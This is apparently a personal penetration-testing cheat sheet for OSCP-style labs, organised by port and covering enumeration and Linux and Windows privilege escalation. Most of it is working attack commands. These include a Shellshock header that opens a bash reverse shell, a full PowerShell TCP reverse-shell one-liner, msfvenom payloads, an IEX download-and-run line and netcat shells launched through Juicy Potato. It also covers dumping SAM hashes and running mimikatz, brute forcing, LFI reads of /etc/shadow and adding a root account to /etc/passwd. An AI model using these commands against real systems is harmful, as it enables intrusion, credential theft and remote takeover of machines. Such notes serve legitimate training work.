   
Pattern
1. Reconnaissance
2. Info gathering
3. Vulnerability Research
4. Exploit
5. Post-Exploit&&Privilege Escalation


    


1. Recon
    1.1  Nmap: 
        'nmap -sC -sV -oA enum/nmap <ip> -p-'
    1.2  nmapAutomator  
        './nmapAutomator full ip'
        https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
                To user nmap scripts
               git clone https://github.com/vulnersCom/nmap-vulners.git
               cp *.nse /usr/share/nmap/scripts
               nmap --script-updatedb
    1.3 AutoRecon — https://github.com/Tib3rius/AutoRecon
    
               
    1.3 Linux
           find . -iname
           find . -name <name> -type 
    1.4 Windows
    
    1.5 Common port
        Unknown port
            amap -d <ip> <port>
            21 FTP
                ftp <ip>
                nc <ip> <port>
                anonymous:anoymous
                binary and ascii mode?
            22 SSH
                nc <ip> <port>  --> search for protocol http://www.openssh.com/txt/rfc4253.txt 
                ssh ip
            23 Telnet
                hydra -l root -P /root/SecLists/Passwords/10_million_password_list_top_100.txt 192.168.1.101 telnet
                patator
                                               
            25 SMTP
                Server to Server service.  Users receives/sends emails suing IMAP or POP3. 
                Then routed to the SMTP server to communicate to another server. Has database. 
                Cannot retrieve any emails, only can send email. 
                    http://null-byte.wonderhowto.com/how-to/hack-like-pro-extract-email-addresses-from-smtp-server-0160814/          
            69 - TFTP
                ftp-server
                UDP
            80- HTTP
                .htaccess can password protect certain directories. 
                    Create a directory which will be password-protected. 
                    Create .htaccess tile inside that directroy. Contents are as follows,
                        AuthType Basic
                        AuthType Basic
                        AuthName "Password Protected Area"
                        AuthUserFile /var/www/html/test/.htpasswd
                        Require valid-user  
                    Create .htpasswd file. Contents are as follows,
                        htpasswd -cb .htpasswd test admin
                        service apache2 restart
                    If the directory does not display a login-prompt, change the apache2.conf as follows,
                        <Directory /var/www/html/test>
                            AllowOverride AuthConfig
                        </Directory>
                    Then, Bruceforce
                        medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
            88- Kerberos
                Network Authentication protocol. 
                Common for Windows Domain controller.
                MS14-068
            110 Pop3
                telnet <ip> 110
                USER pkong@<ip>
                PASS admin
                list   #List all emails
                retr5  #Retrieve email number 5. 
            111 Rpcbind
                RFC 1833
                Can be used to look for NFS-shares.
                rpcbind -p <ip>
            119 NNTP
                Network time protocol, Synchronize time. 
                nc -nvC <ip> 119    # banner grabbing
                    
            135 MSRCP
                nmap <ip> --script=msrpc-enum
                    https://en.wikipedia.org/wiki/Microsoft_RPC    --> Windows rpc port
            139/ 445 SMB SAMBA
                smbclient -L <ip>
                smbclient //<ip>/tmp
                smbclient \\\<ip>\\ipc$ -U pkong
                smbclient //<ip>/ipc$ -U pkong
                    mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
                nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
                enum4linux -a 192.168.1.120
                rpcclient
                    rpcclient -U "" 192.168.1.101
                        srvinfo
                        enumdomusers
                        getdompwinfo
                        querydominfo
                        netshareenum
                        netshareenumall
            143/993 IMAP
                Access email stored on that server from various devices. 
            161-162 SNMP
                Simple Network Managment Protocol
                SNMP 1,2, and 2c clear text traffic. Credentials can be stolen.
                Used to manage devices ona network. 
                MIB- Management information base
                snmpwalk -c public -v1 <ip>
                    1.3.6.1.2.1.25.1.6.0 System Processes
                    1.3.6.1.2.1.25.4.2.1.2 Running Programs
                    1.3.6.1.2.1.25.4.2.1.4 Processes Path
                    1.3.6.1.2.1.25.2.3.1.4 Storage Units
                    1.3.6.1.2.1.25.6.3.1.2 Software Name
                    1.3.6.1.4.1.77.1.2.25 User Accounts
                    1.3.6.1.2.1.6.13.1.3 TCP Local Ports
                snmp-check -t <ip> -c public
                nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt

            199 - Smux
            389/636 LDAP
                Lightweight Directory Access Protocol   (More likely telephone-directory)
                Database tree
                Often in corporate structure, store user information, used for authentication(web application)
                ldapsearch -h <ip> -p 389 -x -b "dc=mywebsite,dc=com"
       
            
            443- HTTPS
                OpenSSL 1.0.1-1.0.1f Vulnerable
                OpenSSL 1.0.1g, 1.0.0, 0.9.8 NOT vulnerable 
                headrbleed? https://heartbleed.com/
                sudo sslscan <IP>:443
                nmap -sV --script=ssl-heartbleed <ip>
                Certificate?
            554-RTSP : Real Time Streaming Protocol
                Statful (TCP)
                IP-cameras, with potential GUI
            587 Submission
                OUtgoing smtp-port
                If postfix is run, could be shellshock
            631 Cups - Common UNIX Printing System
                netstat
                log in: http://localhost:631/admin
                            993 IMAP encrypted
            995 POP3 Encryption
                110 is POP3 non-encrypted
                25, 465
            1025 - NSF or IIS
            1030/1032/1033/1038
                Used by the RPC within Windows Domain.
            1433 MsSql
                sqsh -S <ip> -U sa
                    xp_cmdshell 'date'
                    go                   
            1521 Oracle database
                Enumeration
                    tnscmd10g version -h <ip>
                    tnscmd10g status -h <ip>
            1748,1754,1808,1809 Oracle
                Orcales Intelligent Agent
             
            2049 -NFS
                showmount -e <ip>
                mount <ip>:/tmp/<location>
                
            3389 Remote Desktop
                 rdesktop -u guest -p guest 10.11.1.5 -g 94%    
                 Brute Force 
                     ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
            4555 James Remote Server
                default userid:password
                    root:root
                    
            
        
      
    
1.6. Common Vulnerabilities
    1.6.1 Web
        1.6.1.1 LFIs
            1.6.1.1.1 Linux 
                'LFI - php?list=../../../../../../../../../../etc/shadow'
            1.6.1.1.2 Windows
                'LFI -php?list=../../../../../../../../../../<>>>>'
              
       
    1.6.2 Shellshock
            1.6.2.1 cgi-bin
                  () { :; };  
                  () { :; };  echo $(</etc/passwd) 
                  () { :; }; /bin/echo hello 
                  If not then, cat $PATH from the host machine. 
                    User-Agent:  () { :; };  echo;export PATH=/root/Download/jdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; bash -i >& /dev/tcp/192.168.119.131/8081 0>&1; 
    1.6.3 Tools
            Dirsearch — https://github.com/maurosoria/dirsearch
            GoBuster — https://github.com/OJ/gobuster
            Recursive GoBuster — https://github.com/epi052/recursive-gobuster
            wfuzz — https://github.com/xmendez/wfuzz
            goWAPT — https://github.com/dzonerzy/goWAPT
            ffuf — https://github.com/ffuf/ffuf
            Nikto — https://github.com/sullo/nikto
            dirb — https://tools.kali.org/web-applications/dirb
            dirbuster — https://tools.kali.org/web-applications/dirbuster
    1.6.4 mysql
              ps aux |grep mysql
              mysql -u<id> -p<password> -e 'show databases;'

2.0 Information gathering              
               

 

            
4. Post-Exploitation && Privilege escalation
     Goal
     Restricted low-priv shell --> Unrestricted low-priv shell --> Unrestricted high-priv shell -->Get more info
    4.0.Priviliege Escalation      
      4.0.1 Restriced Shell excape  
           https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
           https://d00mfist.gitbooks.io/ctf/content/escaping_restricted_shell.html
           https://guif.re/linuxeop
               1. $ bin/sh
                  $ echo $PATH
                  $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
                  $ export SHELL=/bin/bash
               2. Hit Double tap to search for available command.
                  https://gtfobins.github.io/ --> search for shell
               3. Host: ssh -t bash -i compromised.pem id@ip
                  $ echo $PATH
                  $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
                  $ export SHELL=/bin/bash
           find / -perm 4755 2>/dev/null
               4. Copy /etc/passwd
                 Use openssl to create hash 
                        Syntax: openssl passwd -1 -salt pkong pass123  
                 Put it on the bottom of passwd
                        pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
               
                  
                  
         4.0.1.1 nc interactive shell
                        # In reverse shell 
                              python -c 'import pty; pty.spawn("/bin/bash")' 
                              Ctrl-Z 
                        #In Kali 
                              stty raw -echo 
                              fg 
                        #In reverse shell 
                              reset 
                              export SHELL=bash 
                              export TERM=xterm-256color 
                              stty rows <num> columns <cols> 
          
          
                                                                  
      4.0.2 Searchsploit for remote execution 
         4.0.2.1 
                    # e.g. searchsploit apach james  35513.py
                    # Download and modify the python script. 
                    # Verify that the script is working
                    # Put bash reverse shell as the payload and catch it from the host using nc. 
                    # Verify the shell echo $0
                    # If the terminal is looking for wrong directory,  copy and paste $PATH
                        export PATH=$PATH:/usr/bin:/sbin:/binusr/local/sbin:/usr/local/bin:/usr/sbin:
                                  
                    echo $SHELL     #which shell? majority of time "rbash"
                    echo $PATH      #Where is it located?
                    set             #gather information--> but which type

          
          
     
     
   4.1 Linux     
      4.1.1 Ref
            https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
            https://guif.re/linuxeop
            Dirtycow   https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
            https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
            https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
            http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
                        
      4.1.2 SUID 
            Copy /etc/passwd
            Use openssl to create hash 
               Syntax: openssl passwd -1 -salt pkong pass123  
            Put it on the bottom of passwd
               pkong:$1$pkong$iErBtt0Nj.89iMln0uMBn.:0:0:root/root:/bin/bash
        
      4.1.3 Manual
            id     --> what is running? 
               Anything suspicious?
                   https://gtfobins.github.io
               if docker     # https://www.hackingarticles.in/docker-privilege-escalation/
                  docker run -v /etc/:/mnt -it alpine
                  cd /mnt
                  cat shadow
            ps aux     --> Search for odd program, then searchsploit. 
            Linux Local Privilege Escalation via SUID /proc/pid/mem Write
                    https://git.zx2c4.com/CVE-2012-0056/about/
            netstat -antup
            uname -a
            /etc/passwd
            /etc/shadow
            /etc/apach2 or /etc/httpd
                grep -Ri DocumentRoot .
            ls -lahR /home
            find / -name "file name" 2>/dev/null
            find / -perm -u=s -type f 2>/dev/null
            Use known credentials
                e.g. Collect credential of mysql database.
                     Identify non-root user with high priviliege
                            cat /etc/passwd|grep -vE "nologin|false" 
                     Bruteforce SSH using the identified passwords and known users. 
                     hydra -l gibson -p zaq1xsw2cde3 10.11.1.71 ssh
      4.1.4  Auto tools
            https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
            https://raw.githubusercontent.com/reider-roque/linpostexp/master/linprivchecker.py
            https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
            
       
        
   4.2 Windows           
        
           ref  : https://samsclass.info/123/proj10/px16-hashcat-win.htm
                  https://guif.re/windowseop
                  https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

           Starts with whoami/priv
           
           From cmd to powershell
                  powershell -NoP -NonI -W Hidden -Exec Bypass -ep bypass "& {$ps=$false;$hostip='1.1.1.1';$port=443;$client = New-Object System.Net.Sockets.TCPClient($hostip,$port);$stream = $client.GetStream();[byte[]]$bytes = 0..50000|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$cmd=(get-childitem Env:ComSpec).value;$inArray=$data.split();$item=$inArray[0];if(($item -eq '$ps') -and ($ps -eq $false)){$ps=$true}if($item -like '?:'){$item='d:'}$myArray=@('cd','exit','d:','pwd','ls','ps','rm','cp','mv','cat');$do=$false;foreach ($i in $myArray){if($item -eq $i){$do=$true}}if($do -or $ps){$sendback=( iex $data 2>&1 |Out-String)}else{$data2='/c '+$data;$sendback = ( &$cmd $data2 2>&1 | Out-String)};if($ps){$prompt='PS ' + (pwd).Path}else{$prompt=(pwd).Path}$sendback2 = $data + $sendback + $prompt + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()}"
                  
                  $ps
           Gathering information
                  systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
                  hostname
                  echo %username%
                  net users
                  net user user1
                  ipconfig /all
                  route print
                  arp -A
                  netstat -ano
                  netsh firewall show state
                  netsh firewall show config
                  schtasks /query /fo LIST /v
                  tasklist /SVC
                  DRIVERQUERY  --look for programs (afd..)
                  wmic qfe get Caption,Description,HotFixID,InstalledOn
                  wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
                  sc qc upnphost
                   
                  

        
      4.2.1 UAC Bypass   ref: https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
             Look for following indicators
                   SeChangeNotifyPrivilege'       Bypass traverse checking             Enabled 
                   reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
                    
             EnableLUA if 0 == execute PsExec || if 1 == check for followings
                    ConsentPromptBehaviorAdmin   either 0, 2 or 5.
                    PromptOnSecureDesktop        either 0 or 1.
             
             Search for enventvwr
                    where /r C:\windows eventvwr.exe
             Download strings.exe 
                    https://docs.microsoft.com/en-us/sysinternals/downloads/strings
             Verify that AutoElevate is "True"
                    strings64.exe -accepteula C:\Windows\System32\eventvwr.exe | findstr /i autoelevate
      
             Download: https://github.com/turbo/zero2hero  --> main.c
             Create two reverse shells
                     msfvenom -a x86 --platform Windows -p windows/shell_everse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
                     msfvenom -a x86 --platform Windows -p windows/shell_everse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe

                     msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=3333 -f exe -o reverse_3333.exe
                     msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.119.131 LPORT=4444 -f exe -o reverse_4444.exe
             Update the main.c file then compile 
                      x86_64-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x64
                      i686-w64-mingw32-gcc shell.c -o shell.exe  --> compile to x86
             Download PsExec
                      https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
                      PsExec64.exe -i -accepteula -d -s reverse_3333.exe
             
      4.2.2 Passing another user's creds
            '/Psexec.exe /accepteula -user alice -p aliceishere -c ./8000.exe'                       
                    
      4.2.3 Saving Creds         
            4.2.3.1 Manual
                Windows Hash: Security Accounts Manager
                    reg save HKLM\SAM c:\SAM
                    reg save HKLM\System c:\System
                        --> Then smbserver to save back to kali. 
                    'samdump2 System SAM'
            4.2.3.2 Auto
                Gain admin priviliege
                Run mimikatz
                    privilege::debug
                    token::elevate
                    lsadump::sam
      4.2.4 Juicy Potato   - Golden privilege
            https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/
            https://github.com/ivanitlearning/Juicy-Potato-x86/releases for x86
            
                whoami /all
                check     SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
                https://github.com/ivanitlearning/Juicy-Potato-x86/releases/download/1.2/Juicy.Potato.x86.exe
                https://eternallybored.org/misc/netcat/
                               
                
                Verify that Juicy Potato works on the computer. 
                Search for working CSLID and run a common program to test the CSLID. 
                   jp86.exe -t t -p c:\windows\system32\cmd.exe -l 5839 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
                   
                1. Send Powershell 
                   Create a bat file
                     powershell "IEX(New-Object Net.Webclient).downloadString('http//192.168.119.131/rev_4444.ps1')"
                   Create a reverse shell using nisheng and name it rev_4444.ps1
                   Execute the bat file using Juicy Potato
                     jp86.exe -t * -p C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\see.bat -l 9001 -c "{A47979D2-C419-11D9-A5B4-001185AD2B89}"
                     host: rlwrap -r nc -nlvp 4444
                2. Netcat way
                   Place Juicy Potato and netcat on the target computer. 
                      JuicyPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\wamp\www\PHP\1\fileManager\collectives\DG0\hackme\nc.exe -e cmd.exe 10.10.10.12 443" -t
                      Host: rlwrap -r nc -nlvp 
           4.2.5 Lovely Potato - Automated Juicy Potato
               https://github.com/TsukiCTF/Lovely-Potato/tree/e21c3a95bd8421c9584533529f00966f3ea24071
               
           4.2.6  JAWS
               https://github.com/411Hall/JAWS
                    
                    
  
            
       

https://docs.microsoft.com/en-us/sysinternals/downloads/psexec


Windows x86 Machine powershell location
    C:\Windows\System32\WindowsPowerShell\v1.0
    C:\Windows\SysWOW64\WindowsPowerShell\v1.0
Windows x64 Machine Powershell location

Powershell command
    Download file 
    Invoke-WebRequest URL -OutFile c:\file.ext
    
Extra info,

Don't know where to put yet


Reporting Frameworks

    Dradis — https://dradisframework.com/academy/industry/compliance/oscp/
    Serpico — https://github.com/SerpicoProject/Serpico

Report Template

    Created by whoisflynn — https://github.com/whosiflynn/OSCP-Exam-Report-Template





Network Tools

    Impacket (SMB, psexec, etc) — https://github.com/SecureAuthCorp/impacket

File Transfers

    updog — https://github.com/sc0tfree/updog

Wordlists / Dictionaries

    SecLists — https://github.com/danielmiessler/SecLists

Payload Generators

    Reverse Shell Generator — https://github.com/m0rph-1/revshellgen
    Windows Reverse Shell Generator — https://github.com/thosearetheguise/rev
    MSFVenom Payload Creator — https://github.com/g0tmi1k/msfpc

PHP Reverse Shells

    Windows PHP Reverse Shell — https://github.com/Dhayalanb/windows-php-reverse-shell
    PenTestMonkey Unix PHP Reverse Shell — http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Terminal Related

    tmux — https://tmuxcheatsheet.com/ (cheat sheet)
    tmux-logging — https://github.com/tmux-plugins/tmux-logging
    Oh My Tmux — https://github.com/devzspy/.tmux
    screen — https://gist.github.com/jctosta/af918e1618682638aa82 (cheat sheet)
    Terminator — http://www.linuxandubuntu.com/home/terminator-a-linux-terminal-emulator-with-multiple-terminals-in-one-window

Exploits

    Exploit-DB — https://www.exploit-db.com/
    Windows Kernel Exploits — https://github.com/SecWiki/windows-kernel-exploits
    AutoNSE — https://github.com/m4ll0k/AutoNSE
    Linux Kernel Exploits — https://github.com/lucyoa/kernel-exploits

Password Brute Forcers

    BruteX — https://github.com/1N3/BruteX
    Hashcat — https://hashcat.net/hashcat/
    John the Ripper — https://www.openwall.com/john/

Post-Exploitation / Privilege Escalation

    LinEnum — https://github.com/rebootuser/LinEnum
    linprivchecker —https://www.securitysift.com/download/linuxprivchecker.py
    Powerless — https://github.com/M4ximuss/Powerless
    PowerUp — https://github.com/HarmJ0y/PowerUp
    Linux Exploit Suggester — https://github.com/mzet-/linux-exploit-suggester
    Windows Exploit Suggester — https://github.com/bitsadmin/wesng
    Windows Privilege Escalation Awesome Scripts (WinPEAS) — https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
    Linux Privilege Escalation Awesome Script (LinPEAS) — https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
    GTFOBins (Bypass local restrictions) — https://gtfobins.github.io/
    sudo_killer — https://github.com/TH3xACE/SUDO_KILLER
    https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
    https://medium.com/bugbountywriteup/privilege-escalation-in-windows-380bee3a2842
    https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
    



Extra Practice

    HTB/Vulnhub like OSCP machines (Curated by OffSec Community Manager TJNull)— https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159
    Virtual Hacking Labs — https://www.virtualhackinglabs.com/
    HackTheBox (Requires VIP for Retired machines) — https://www.hackthebox.eu/
    Vulnhub — https://www.vulnhub.com/
    Root-Me — https://www.root-me.org/
    Local Privilege Escalation Workshop — https://github.com/sagishahar/lpeworkshop
         

Update searchsploit 
    searchsploit -u
    apt -y install exploitdb exploitdb-papers   #time consuming, not needed for test, adding research papers
